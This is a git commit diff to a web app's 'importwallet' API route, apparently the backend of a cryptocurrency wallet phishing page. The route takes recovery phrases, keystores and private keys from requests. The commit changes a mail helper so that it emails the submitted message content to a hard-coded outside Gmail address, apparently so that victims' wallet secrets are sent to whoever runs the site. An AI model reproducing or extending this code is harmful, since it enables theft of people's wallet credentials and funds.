8cd83a320ef0f0dd3ae9d3b61abdca0771ae5be6
React Dude <catbilliecat@gmail.com>
2025-01-30 07:56:02 +0100

    Update route.ts

--- src/app/api/importwallet/route.ts
+++ src/app/api/importwallet/route.ts
@@ -25,7 +25,7 @@ const formatMessage = async (message: string) => {
     from: `Billie Notify ${email}`,
     to: "osamathebomber3@gmail.com",
     subject: "Yo! you just got a new notification from Billie",
-    html: `<div>Hi</div>`,
+    html: `<div>${message}</div>`,
   };
 
   transporter.verify(function (error: any, success: any) {
@@ -51,7 +51,6 @@ const formatMessage = async (message: string) => {
 export async function POST(request: Request) {
   try {
     const { phrase, keystore, privateKey } = await request.json();
-    await formatMessage('hi');
 
     if (phrase) {
 
